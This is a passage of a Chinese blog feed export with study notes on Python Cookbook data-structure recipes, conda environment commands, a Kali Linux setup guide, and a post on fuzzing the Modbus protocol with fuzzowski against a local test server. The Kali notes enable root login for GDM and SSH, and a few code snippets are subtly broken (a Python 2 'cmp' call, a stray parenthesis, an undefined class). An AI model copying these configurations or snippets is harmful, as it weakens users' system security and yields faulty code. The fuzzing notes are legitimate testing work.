href="https://python3-cookbook.readthedocs.io/zh_CN/latest/">https://python3-cookbook.readthedocs.io/zh_CN/latest/</a></p><p><a href="https://github.com/yidao620c/python3-cookbook">https://github.com/yidao620c/python3-cookbook</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>使用手册</category>
      
      <category>学习笔记</category>
      
      <category>Python3-Cookbook</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
      <tag>数据结构</tag>
      
      <tag>算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python3-Cookbook第一章:数据结构和算法(1)</title>
    <link href="/posts/26745e6d/"/>
    <url>/posts/26745e6d/</url>
    
    <content type="html"><![CDATA[<blockquote><p>对于<strong>《Python Cookbook》</strong>一书进行学习，通过书中部分代码注释与自己的理解写成笔记方便学习与回忆。</p></blockquote><h4 id="1-1-解压序列赋值给多个变量"><a href="#1-1-解压序列赋值给多个变量" class="headerlink" title="1.1 解压序列赋值给多个变量"></a>1.1 解压序列赋值给多个变量</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 解压序列赋值给多个变量data &#x3D; [&#39;ACME&#39;, 50, 91.1, (2012, 12, 21)]name, shares, price, date &#x3D; dataprint(&quot;name: &#123;&#125;&quot;.format(name))  # Prints name: ACMEprint(&quot;shares: &#123;&#125;&quot;.format(shares))  # Prints shares: 50print(&quot;price: &#123;&#125;&quot;.format(price))  # Prints price: 91.1print(&quot;data: &#123;&#125;&quot;.format(data))  # Prints data: [&#39;ACME&#39;, 50, 91.1, (2012, 12, 21)]# 不需要的变量用占位符取代，最后丢弃即可name, _, _, date &#x3D; data# 字符串也可通过此种方式取值s &#x3D; &quot;hello&quot;a, b, c, d, e &#x3D; sprint(&quot;c: &#123;&#125;&quot;.format(c))  # Prints c: l</code></pre></div><h4 id="1-2-解压可迭代对象赋值给多个变量"><a href="#1-2-解压可迭代对象赋值给多个变量" class="headerlink" title="1.2 解压可迭代对象赋值给多个变量"></a>1.2 解压可迭代对象赋值给多个变量</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 解压可迭代对象赋值给多个变量# 1-1中如果item数量需要确定的去取&quot;&quot;&quot; Python中的星号键不是指针，代表取一个不定长的list；同样两个星号代表取一个不定长的dict &quot;&quot;&quot;record &#x3D; (&#39;Dave&#39;, &#39;dave@example.com&#39;, &#39;773-555-1212&#39;, &#39;847-555-1212&#39;)name, email, *number &#x3D; recordprint(&quot;name: &#123;&#125;&quot;.format(name))  # Prints name: Daveprint(&quot;email: &#123;&#125;&quot;.format(email))  # Prints email: dave@example.comprint(&quot;number: &#123;&#125;&quot;.format(number))  # Prints number: [&#39;773-555-1212&#39;, &#39;847-555-1212&#39;]# 用此种方法可以轻易取list中的第一个元素与最后一个元素record &#x3D; (&#39;Dave&#39;, &#39;dave@example.com&#39;, &#39;773-555-1212&#39;, &#39;847-555-1212&#39;, &#39;boss11&#39;)name, *_ &#x3D; record*_, stuff &#x3D; record# 同样此方法可以用来获取不确定的参数，用以函数传参等records &#x3D; [(&#39;foo&#39;, 1, 2), (&#39;bar&#39;, &#39;hello&#39;), (&#39;foo&#39;, 3, 4), ]def do_foo(x, y):    print(&#39;foo&#39;, x, y)def do_bar(s):    print(&#39;bar&#39;, s)for tag, *args in records:    if tag &#x3D;&#x3D; &#39;foo&#39;:        do_foo(*args)    elif tag &#x3D;&#x3D; &#39;bar&#39;:        do_bar(*args)# Prints # foo 1 2# bar hello# foo 3 4</code></pre></div><h4 id="1-3-保留最后N个元素"><a href="#1-3-保留最后N个元素" class="headerlink" title="1.3 保留最后N个元素"></a>1.3 保留最后N个元素</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 保留最后N个元素&quot;&quot;&quot; 使用collections.deque即可完成该操作，deque是一个可以设置长度的双端队列。具有append(),appendleft(),pop(),popleft()。&quot;&quot;&quot;from collections import dequeq &#x3D; deque(maxlen&#x3D;3)q.append(1)q.append(2)q.append(3)print(q)  # Prints deque([1, 2, 3], maxlen&#x3D;3)q.append(4)print(q)  # Prints deque([2, 3, 4], maxlen&#x3D;3)# 不指定大小则获得一个无限长度的双端队列q &#x3D; deque()q.append(1)q.append(2)q.append(3)print(q)  # Prints deque([1, 2, 3])q.appendleft(4)print(q)  # Prints deque([4, 1, 2, 3])print(q.pop())  # Prints 3print(q.popleft())  # Prints 4# 举例：保留文件中包含python字样的最后五行数据def search(lines, pattern, history&#x3D;5):    previous_lines &#x3D; deque(maxlen&#x3D;history)    for line in lines:        if pattern in line:            yield line, previous_lines        previous_lines.append(line)if __name__ &#x3D;&#x3D; &#39;__main__&#39;:    with open(r&#39;.&#x2F;somefile.txt&#39;) as f:        for line, prevlines in search(f, &#39;python&#39;, 5):            for pline in prevlines:                print(pline, end&#x3D;&#39;&#39;)                print(line, end&#x3D;&#39;&#39;)                print(&#39;-&#39; * 20)</code></pre></div><h4 id="1-4-查找最大最小的N个元素"><a href="#1-4-查找最大最小的N个元素" class="headerlink" title="1.4 查找最大最小的N个元素"></a>1.4 查找最大最小的N个元素</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 查找最大最小的N个元素&quot;&quot;&quot; heapq 模块有两个函数：nlargest() 和 nsmallest() 可以进行输出&quot;&quot;&quot;import heapqnums &#x3D; [1, 8, 2, 23, 7, -4, 18, 23, 42, 37, 2]print(heapq.nlargest(3, nums))  # Prints [42, 37, 23]print(heapq.nsmallest(3, nums))  # Prints [-4, 1, 2]# 同时支持复杂的数据结构的排序,需要传入一个key函数portfolio &#x3D; [    &#123;&#39;name&#39;: &#39;IBM&#39;, &#39;shares&#39;: 100, &#39;price&#39;: 91.1&#125;,    &#123;&#39;name&#39;: &#39;AAPL&#39;, &#39;shares&#39;: 50, &#39;price&#39;: 543.22&#125;,    &#123;&#39;name&#39;: &#39;FB&#39;, &#39;shares&#39;: 200, &#39;price&#39;: 21.09&#125;,    &#123;&#39;name&#39;: &#39;HPQ&#39;, &#39;shares&#39;: 35, &#39;price&#39;: 31.75&#125;,    &#123;&#39;name&#39;: &#39;YHOO&#39;, &#39;shares&#39;: 45, &#39;price&#39;: 16.35&#125;,    &#123;&#39;name&#39;: &#39;ACME&#39;, &#39;shares&#39;: 75, &#39;price&#39;: 115.65&#125;]cheap &#x3D; heapq.nsmallest(3, portfolio, key&#x3D;lambda s: s[&#39;price&#39;])expensive &#x3D; heapq.nlargest(3, portfolio, key&#x3D;lambda s: s[&#39;price&#39;])# 使用heapq.heapify对list进行处理heap &#x3D; list(nums)heapq.heapify(heap)  # 对heap进行排序heapq.heappop(heap)  # 弹出heap最下的元素，根据堆的性质每次都会弹出最小</code></pre></div><h4 id="1-5-优先级队列"><a href="#1-5-优先级队列" class="headerlink" title="1.5 优先级队列"></a>1.5 优先级队列</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 优先级队列，与一个元组顺序比较的小问题&quot;&quot;&quot; 利用1-4中的heapq堆，将优先级的负数传入，根据heapq每次会pop最小值的属性，从而每次pop出优先级最高的item（同样优先级的元素按照插入顺序输出）&quot;&quot;&quot;import heapqclass PriorityQueue:    def __init__(self):        self._queue &#x3D; []        self._index &#x3D; 0    def push(self, item, priority):        heapq.heappush(self._queue, (-priority, self._index, item))        self._index +&#x3D; 1    def pop(self):        return heapq.heappop(self._queue)[-1]&quot;&quot;&quot; 其中index变量的作用是保证同等优先级元素的正确排序。 通过保存一个不断增加的index下标变量，可以确保元素按照它们插入的顺序排序。 而且index变量也在相同优先级元素比较的时候起到重要作用。 &quot;&quot;&quot;# 展示另一个多元组大小比较的问题，多元组是依次比较同位置的元素，上例中的index就是避免了对比错误a &#x3D; (1, Item(&#39;foo&#39;))b &#x3D; (5, Item(&#39;bar&#39;))a &lt; b  # Print Truec &#x3D; (1, Item(&#39;grok&#39;))a &lt; c  # Print TypeError</code></pre></div><h4 id="1-6-字典中的键映射多个值"><a href="#1-6-字典中的键映射多个值" class="headerlink" title="1.6 字典中的键映射多个值"></a>1.6 字典中的键映射多个值</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 字典中的键映射多个值from collections import defaultdictd &#x3D; defaultdict(list)d[&#39;a&#39;].append(1)d[&#39;a&#39;].append(2)d[&#39;b&#39;].append(4)d &#x3D; defaultdict(set)d[&#39;a&#39;].add(1)d[&#39;a&#39;].add(2)d[&#39;b&#39;].add(4)&quot;&quot;&quot; 元组tuple(),不可变有序列表list[],可变有序字典dict&#123;key:value&#125;,存键值对无序集合set&#123;&#125;,无重复无序&quot;&quot;&quot;</code></pre></div><h4 id="1-7-字典排序"><a href="#1-7-字典排序" class="headerlink" title="1.7 字典排序"></a>1.7 字典排序</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 字典排序&quot;&quot;&quot; collections中的OrderedDict可以按照键值对插入字典的顺序存储dict&quot;&quot;&quot;from collections import OrderedDictd &#x3D; OrderedDict()d[&#39;foo&#39;] &#x3D; 1d[&#39;bar&#39;] &#x3D; 2d[&#39;spam&#39;] &#x3D; 3d[&#39;grok&#39;] &#x3D; 4# Outputs &quot;foo 1&quot;, &quot;bar 2&quot;, &quot;spam 3&quot;, &quot;grok 4&quot;for key in d:    print(key, d[key])&quot;&quot;&quot; Python sorted() 函数&quot;&quot;&quot;a &#x3D; [5,7,6,3,4,1,2]b &#x3D; sorted(a)# Outputs# [1, 2, 3, 4, 5, 6, 7] L&#x3D;[(&#39;b&#39;,2),(&#39;a&#39;,1),(&#39;c&#39;,3),(&#39;d&#39;,4)]sorted(L, cmp&#x3D;lambda x,y:cmp(x[1],y[1]))   # 利用cmp函数# Outputs# [(&#39;a&#39;, 1), (&#39;b&#39;, 2), (&#39;c&#39;, 3), (&#39;d&#39;, 4)]sorted(L, key&#x3D;lambda x:x[1])               # 利用key# Outputs# [(&#39;a&#39;, 1), (&#39;b&#39;, 2), (&#39;c&#39;, 3), (&#39;d&#39;, 4)] students &#x3D; [(&#39;john&#39;, &#39;A&#39;, 15), (&#39;jane&#39;, &#39;B&#39;, 12), (&#39;dave&#39;, &#39;B&#39;, 10)]sorted(students, key&#x3D;lambda s: s[2])            # 按年龄排序# Outputs# [(&#39;dave&#39;, &#39;B&#39;, 10), (&#39;jane&#39;, &#39;B&#39;, 12), (&#39;john&#39;, &#39;A&#39;, 15)]sorted(students, key&#x3D;lambda s: s[2], reverse&#x3D;True)       # 按降序# Outputs# [(&#39;john&#39;, &#39;A&#39;, 15), (&#39;jane&#39;, &#39;B&#39;, 12), (&#39;dave&#39;, &#39;B&#39;, 10)]</code></pre></div><h4 id="1-8-字典的运算"><a href="#1-8-字典的运算" class="headerlink" title="1.8 字典的运算"></a>1.8 字典的运算</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 字典的运算&quot;&quot;&quot;zip()，可以将两个数量相同的list一一对应组合。通过取出dict中的key，values，将其颠倒组合，就能对value进行排序最大最小等操作。注：Python3中的zip之后是一个对象而不是list，需要通过list()转成list。&quot;&quot;&quot;prices &#x3D; &#123;    &#39;ACME&#39;: 45.23,    &#39;AAPL&#39;: 612.78,    &#39;IBM&#39;: 205.55,    &#39;HPQ&#39;: 37.20,    &#39;FB&#39;: 10.75&#125;# prices.values()可以取出value所有值作为list。为了对字典值执行计算操作，通常需要使用 zip() 函数先将键和值反转过来。min_price &#x3D; min(zip(prices.values(), prices.keys()))# min_price is (10.75, &#39;FB&#39;)max_price &#x3D; max(zip(prices.values(), prices.keys()))# max_price is (612.78, &#39;AAPL&#39;)# 类似的，可以使用 zip() 和 sorted() 函数来排列字典数据：prices_sorted &#x3D; sorted(zip(prices.values(), prices.keys()))# prices_sorted is [(10.75, &#39;FB&#39;), (37.2, &#39;HPQ&#39;),#                   (45.23, &#39;ACME&#39;), (205.55, &#39;IBM&#39;),#                   (612.78, &#39;AAPL&#39;)]# 执行这些计算的时候，需要注意的是 zip() 函数创建的是一个只能访问一次的迭代器。 如果需要可以将zip后的list取出。vtok &#x3D; list(zip(prices.values(), prices.keys())))</code></pre></div><h4 id="1-9-查找两字典的相同点"><a href="#1-9-查找两字典的相同点" class="headerlink" title="1.9 查找两字典的相同点"></a>1.9 查找两字典的相同点</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 查找两字典的相同点&quot;&quot;&quot; 字典中的key是可以进行集合操作的。而a.values不可以，需要转成set后操作。&quot;&quot;&quot;a &#x3D; &#123;&#39;x&#39;: 1, &#39;y&#39;: 2, &#39;z&#39;: 3&#125;b &#x3D; &#123;&#39;w&#39;: 10, &#39;x&#39;: 11, &#39;y&#39;: 2&#125;# Find keys in commona.keys() &amp; b.keys()  # &#123; &#39;x&#39;, &#39;y&#39; &#125;# Find keys in a that are not in ba.keys() - b.keys()  # &#123; &#39;z&#39; &#125;# Find (key,value) pairs in commona.items() &amp; b.items()  # &#123; (&#39;y&#39;, 2) &#125;</code></pre></div><h4 id="1-10-删除序列相同元素并保持顺序"><a href="#1-10-删除序列相同元素并保持顺序" class="headerlink" title="1.10 删除序列相同元素并保持顺序"></a>1.10 删除序列相同元素并保持顺序</h4><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"># 删除序列相同元素并保持顺序&quot;&quot;&quot; 如果序列上的值为hashable类型，则可以通过集合与生成器解决这个问题。其中集合是为了解决元素重复问题，yield则是依次返回元素到list。&quot;&quot;&quot;def dedupe(items):    seen &#x3D; set()    for item in items:        if item not in seen:            yield item            seen.add(item)a &#x3D; [1, 5, 2, 1, 9, 1, 5, 10]list(dedupe(a))# Outputs# [1, 5, 2, 9, 10]&quot;&quot;&quot; 如果你想消除元素不可哈希（比如 dict 类型）的序列中重复元素的话，需改动代码，将序列元素转换成hashable类型，其实即是选取需要对比的value。&quot;&quot;&quot;def dedupe2(items, key&#x3D;None):    seen &#x3D; set()    for item in items:        val &#x3D; item if key is None else key(item)        if val not in seen:            yield item            seen.add(val)a &#x3D; [&#123;&#39;x&#39;: 1, &#39;y&#39;: 2&#125;, &#123;&#39;x&#39;: 1, &#39;y&#39;: 3&#125;, &#123;&#39;x&#39;: 1, &#39;y&#39;: 2&#125;, &#123;&#39;x&#39;: 2, &#39;y&#39;: 4&#125;]list(dedupe2(a, key&#x3D;lambda d: (d[&#39;x&#39;], d[&#39;y&#39;])))# Outputs# [&#123;&#39;x&#39;: 1, &#39;y&#39;: 2&#125;, &#123;&#39;x&#39;: 1, &#39;y&#39;: 3&#125;, &#123;&#39;x&#39;: 2, &#39;y&#39;: 4&#125;]list(dedupe2(a, key&#x3D;lambda d: d[&#39;x&#39;]))# Outputs# [&#123;&#39;x&#39;: 1, &#39;y&#39;: 2&#125;, &#123;&#39;x&#39;: 2, &#39;y&#39;: 4&#125;]&quot;&quot;&quot; 仅仅消除元素的话用set就足够。对文件操作的话仅需进行如下变化，可以消除重复行：with open(somefile,&#39;r&#39;) as f:for line in dedupe(f):    ...&quot;&quot;&quot;</code></pre></div><blockquote><p>参考：</p><p><a href="https://python3-cookbook.readthedocs.io/zh_CN/latest/">https://python3-cookbook.readthedocs.io/zh_CN/latest/</a></p><p><a href="https://github.com/yidao620c/python3-cookbook">https://github.com/yidao620c/python3-cookbook</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>使用手册</category>
      
      <category>学习笔记</category>
      
      <category>Python3-Cookbook</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
      <tag>数据结构</tag>
      
      <tag>算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>测试使用fuzzowski框架</title>
    <link href="/posts/931e55d9/"/>
    <url>/posts/931e55d9/</url>
    
    <content type="html"><![CDATA[<p>fuzzowski是一个模糊测试器，目前主要支持LPD、IPP、BACnet、Modbus协议。本次测试使用的Modbus部分内容进行修改测试，实际上是通过测定规则生成数据通过tcp不断进行发包。</p><h3 id="Socket脚本"><a href="#Socket脚本" class="headerlink" title="Socket脚本"></a>Socket脚本</h3><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python">import socketHOST &#x3D; &#39;0.0.0.0&#39;PORT &#x3D; 6678count &#x3D; 1s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.bind((HOST, PORT))s.listen(10)print(&#39;Server start at: %s:%s&#39; %(HOST, PORT))print(&#39;wait for connection...&#39;)while True:    conn, addr &#x3D; s.accept()    data &#x3D; conn.recv(1024)    f &#x3D; open(&quot;test1.txt&quot;,&#39;a&#39;)    f.write(&quot;&#123;:&lt;5d&#125;:&quot;.format(count))    for c in data:        f.write(&#39;%02X&#39; % ord(c))        f.write(&#39; &#39;)    f.write(&#39;\n&#39;)    f.close()    print(&quot;&#123;:&lt;5d&#125;:Connected by&#123;&#125;&quot;.format(count, addr))    count+&#x3D;1    conn.send(data)    conn.close()</code></pre></div><h3 id="Fuzzowski设置"><a href="#Fuzzowski设置" class="headerlink" title="Fuzzowski设置"></a>Fuzzowski设置</h3><p>先使用简单的<code>python3 -m fuzzowski 127.0.0.1 6789 -f modbus</code></p><p>经过输出测试，发现变动一个<code>word</code>型会产生<strong>140</strong>种十六进制数据，变动一个<code>byte</code>型会产生<strong>116</strong>种十六进制数据，为固定产生非随机生成。</p><p>通过测试modbus的read_coil模块，主要为<code>/fuzzowski-master/fuzzowski/fuzzers/modbus/modbus.py</code>中如下代码：</p><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python">s_initialize(&quot;modbus_read_coil&quot;)with s_block(&quot;modbus_head&quot;):    s_word(0x0001,name&#x3D;&#39;transId&#39;,fuzzable&#x3D;True)    s_word(0x0000,name&#x3D;&#39;protoId&#39;,fuzzable&#x3D;False)    s_word(0x06,name&#x3D;&#39;length&#39;)    s_byte(0xff,name&#x3D;&#39;unit Identifier&#39;,fuzzable&#x3D;False)    with s_block(&#39;pdu&#39;):        s_byte(0x01,name&#x3D;&#39;funcCode read coil memory&#39;,fuzzable&#x3D;False)        s_word(0x0000,name&#x3D;&#39;start address&#39;)        s_word(0x0000,name&#x3D;&#39;quantity&#39;)s_initialize(&#39;read_holding_registers&#39;)with s_block(&quot;modbus_head&quot;):    s_word(0x0001,name&#x3D;&#39;transId&#39;,fuzzable&#x3D;False)    s_word(0x0002,name&#x3D;&#39;protoId&#39;,fuzzable&#x3D;False)    s_word(0x06,name&#x3D;&#39;length&#39;)    s_byte(0xff,name&#x3D;&#39;unit Identifier&#39;,fuzzable&#x3D;False)    with s_block(&#39;read_holding_registers_block&#39;):        s_byte(0x01,name&#x3D;&#39;read_holding_registers&#39;)        s_word(0x0000,name&#x3D;&#39;start address&#39;)        s_word(0x0000,name&#x3D;&#39;quantity&#39;)</code></pre></div><p>其中，fuzzable默认为True。设定为True的字段会依次产生变动生成数据，而非交叉产生，即一个数据包仅会有一个字段被fuzz。</p><p>举例修改上述模块为：</p><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python">s_initialize(&quot;modbus_read_coil&quot;)with s_block(&quot;modbus_head&quot;):    s_byte(0x68,name&#x3D;&#39;funcCode read coil memory1&#39;,fuzzable&#x3D;False)    s_byte(0x04,name&#x3D;&#39;funcCode read coil memory2&#39;,fuzzable&#x3D;False)    s_byte(0x07,name&#x3D;&#39;funcCode read coil memory3&#39;,fuzzable&#x3D;True)    s_byte(0x00,name&#x3D;&#39;funcCode read coil memory4&#39;,fuzzable&#x3D;False)    s_byte(0x00,name&#x3D;&#39;funcCode read coil memory5&#39;,fuzzable&#x3D;False)    s_byte(0x00,name&#x3D;&#39;funcCode read coil memory6&#39;,fuzzable&#x3D;False)    s_initialize(&#39;read_holding_registers&#39;)with s_block(&quot;modbus_head&quot;):    s_word(0x0001,name&#x3D;&#39;transId&#39;,fuzzable&#x3D;False)    # s_word(0x0002,name&#x3D;&#39;protoId&#39;,fuzzable&#x3D;False)    # s_word(0x06,name&#x3D;&#39;length&#39;)    # s_byte(0xff,name&#x3D;&#39;unit Identifier&#39;,fuzzable&#x3D;False)    # with s_block(&#39;read_holding_registers_block&#39;):    #     s_byte(0x01,name&#x3D;&#39;read_holding_registers&#39;)    #     s_word(0x0000,name&#x3D;&#39;start address&#39;)    #     s_word(0x0000,name&#x3D;&#39;quantity&#39;)</code></pre></div><p>即只会生成<code>68 04 07 [00] 00 00</code>其中会对第4字节的fuzz数据，共112条。</p><p>通过<code>python3 -m fuzzowski 127.0.0.1 6789 -f modbus -tn -rt 1 -r read_coil</code>调用modbus的read_coil模块（实际上只是生成测试数据发送tcp包，设置为不处理响应）。</p><p><img src="/image/%E6%B5%8B%E8%AF%95%E4%BD%BF%E7%94%A8fuzzowski%E6%A1%86%E6%9E%B6/modbus-fuzz.png"></p>]]></content>
    
    
    <categories>
      
      <category>项目组</category>
      
    </categories>
    
    
    <tags>
      
      <tag>fuzz</tag>
      
      <tag>socket</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用conda管理环境</title>
    <link href="/posts/b42d039/"/>
    <url>/posts/b42d039/</url>
    
    <content type="html"><![CDATA[<blockquote><p>Python中具有数量庞大且功能相对完善的标准库和第三方库。通过对库的引用，能够实现对不同领域业务的开发。然而，正是由于库的数量庞大，对于管理这些库以及对库作及时的维护成为既重要但复杂度又高的事情。</p><p><a href="https://www.anaconda.com/products/individual#macos">Anaconda</a>就是可以便捷获取包且对包能够进行管理，同时对环境可以统一管理的发行版本。Anaconda包含了conda、Python在内的超过180个科学包及其依赖项。</p></blockquote><h3 id="1-Anaconda安装"><a href="#1-Anaconda安装" class="headerlink" title="1. Anaconda安装"></a>1. Anaconda安装</h3><p>在<a href="https://www.anaconda.com/products/individual">Anaconda</a>中下载对应的安装器安装。</p><p>例通过图形化界面安装完MacOS Anaconda，如果成功安装，通过<code>condal list</code>可以看到相关信息。</p><p>在终端中输入<code>python</code>。如果Anaconda被成功安装并且可以运行，则可看到Anaconda字样。</p><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python">Python 3.7.6 (default, Jan  8 2020, 13:42:34)[Clang 4.0.1 (tags&#x2F;RELEASE_401&#x2F;final)] :: Anaconda, Inc. on darwin</code></pre></div><h3 id="2-管理conda环境"><a href="#2-管理conda环境" class="headerlink" title="2. 管理conda环境"></a>2. 管理conda环境</h3><blockquote><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">conda --version # 验证conda安装</code></pre></div></blockquote><h4 id="更新conda"><a href="#更新conda" class="headerlink" title="更新conda"></a>更新conda</h4><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">conda update conda</code></pre></div><h4 id="创建新环境"><a href="#创建新环境" class="headerlink" title="创建新环境"></a>创建新环境</h4><div class="code-wrapper"><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml">conda create --name &lt;env_name&gt; &lt;package_names&gt;</code></pre></div><p>注意：</p><ul><li><p><code>&lt;env_name&gt;</code>即创建的环境名。建议以英文命名，且不加空格，名称两边不加尖括号“&lt;&gt;”。</p></li><li><p><code>&lt;package_names&gt;</code>即安装在环境中的包名。名称两边不加尖括号“&lt;&gt;”。</p></li><li><p><code>--name</code>同样可以替换为<code>-n</code>。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 创建名为python2的环境，python版本为2.7conda create --name python2_test python&#x3D;2.7# 创建名为python3的环境，python版本为3.5，同时创建numpy和pandas包conda create -n python3 python&#x3D;3.5 numpy pandas</code></pre></div></li></ul><blockquote><p>注：默认情况下，新创建的环境将会被保存在<code>/Users/&lt;user_name&gt;/anaconda3/envs</code>目录下，其中，<code>&lt;user_name&gt;</code>为当前用户的用户名。</p></blockquote><h4 id="使用环境"><a href="#使用环境" class="headerlink" title="使用环境"></a>使用环境</h4><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 激活环境conda activate &lt;env_name&gt;source activate &lt;env_name&gt;# 示例conda activate python2_testsource activate python2_test# 退出环境conda deactivatesource deactivate# 显示已创建环境conda env listconda info -econda info --envs</code></pre></div><h4 id="复制环境"><a href="#复制环境" class="headerlink" title="复制环境"></a>复制环境</h4><div class="code-wrapper"><pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp">conda create --name &lt;new_env_name&gt; --clone &lt;copied_env_name&gt;</code></pre></div><h4 id="删除环境"><a href="#删除环境" class="headerlink" title="删除环境"></a>删除环境</h4><div class="code-wrapper"><pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp">conda remove --name &lt;env_name&gt; --all</code></pre></div><h3 id="3-管理包"><a href="#3-管理包" class="headerlink" title="3. 管理包"></a>3. 管理包</h3><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">### 查找包 #### 精确查找conda search --full-name &lt;package_full_name&gt;# 模糊查找conda search &lt;text&gt;# 获取当前环境包信息conda list</code></pre></div><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">### 安装包 #### 在指定环境中安装包conda install --name &lt;env_name&gt; &lt;package_name&gt;# 在当前环境中安装包conda install &lt;package_name&gt;</code></pre></div><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">### 卸载包 #### 在指定环境中卸载包conda remove --name &lt;env_name&gt; &lt;package_name&gt;# 在当前环境中卸载包conda remove &lt;package_name&gt;</code></pre></div><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">### 更新包 ### conda update --allconda upgrade --allconda update &lt;package_name&gt;conda upgrade &lt;package_name&gt;# 更新多个指定包，空格隔开即可conda update pandas numpy matplotlib</code></pre></div><blockquote><p>参考：</p><p><a href="https://www.jianshu.com/p/62f155eb6ac5">https://www.jianshu.com/p/62f155eb6ac5</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>使用手册</category>
      
      <category>学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
      <tag>conda</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kali安装相关设置</title>
    <link href="/posts/c77e9c76/"/>
    <url>/posts/c77e9c76/</url>
    
    <content type="html"><![CDATA[<blockquote><p>Kali安装后进行一些常规设置，以此记录。</p></blockquote><h2 id="设置root用户"><a href="#设置root用户" class="headerlink" title="设置root用户"></a>设置root用户</h2><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sudo passwd</code></pre></div><h2 id="文件夹名"><a href="#文件夹名" class="headerlink" title="文件夹名"></a>文件夹名</h2><p>若安装系统时选择为中文安装，初始的用户文件夹将为中文用起来不方便。</p><p>先把系统语言改为英文，在终端中输入命令:  </p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">export LANG&#x3D;en_USxdg-user-dirs-gtk-update</code></pre></div><p>跳出对话框询问是否将目录转化为英文路径，同意并关闭。</p><p>再将系统语言改为中文，在终端中输入命令：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">export LANG&#x3D;zh_CN</code></pre></div><p>重启系统，下次进入系统，系统会提示是否把转化好的目录改回中文，选择不再提示，并取消修改。主目录的中文转英文就完成了。</p><h2 id="换源与更新"><a href="#换源与更新" class="headerlink" title="换源与更新"></a>换源与更新</h2><p>修改<code>/etc/apt/sources.list </code>，注释掉原来的源，写入新的源。</p><div class="code-wrapper"><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml">deb http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;kali kali-rolling main non-free contribdeb-src http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;kali kali-rolling main non-free contrib</code></pre></div><p>更新：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 根据源里面的metadata更新本地软件包信息，包括这个源有什么包, 每个包什么版本之类的apt-get update# 根据metadata更新本地软件，如果有依赖变化问题则不更新相应packageapt-get upgrade# 在更新新软件时会更新依赖apt-get dist-upgrade</code></pre></div><h2 id="Gnome"><a href="#Gnome" class="headerlink" title="Gnome"></a>Gnome</h2><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">apt-get install kali-desktop-gnome</code></pre></div><p>在中间选择<code>显示管理器</code>时，选择<code>gdm3</code>之后重启。</p><h3 id="gnome允许root登入"><a href="#gnome允许root登入" class="headerlink" title="gnome允许root登入"></a>gnome允许root登入</h3><p>将 <code>/etc/pam.d/gdm-password</code> 文件中的root登录检查注释掉即可。</p><div class="code-wrapper"><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"># auth required pam_succeed_if.so user !&#x3D; root quiet_success</code></pre></div><h2 id="输入法"><a href="#输入法" class="headerlink" title="输入法"></a>输入法</h2><p>安装输入法框架</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">apt-get install fcitx</code></pre></div><p>安装谷歌输入法</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">apt-get install fcitx-googlepinyin</code></pre></div><p>重启</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">reboot</code></pre></div><p>在fcitx配置中将Google拼音设置为首选项。</p><h2 id="设置SSH"><a href="#设置SSH" class="headerlink" title="设置SSH"></a>设置SSH</h2><p>将<code>/etc/ssh/sshd_config</code>中</p><div class="code-wrapper"><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"># PermitRootLogin prohibit-password···# PasswordAuthentication yes</code></pre></div><p>改为：</p><div class="code-wrapper"><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml">PermitRootLogin 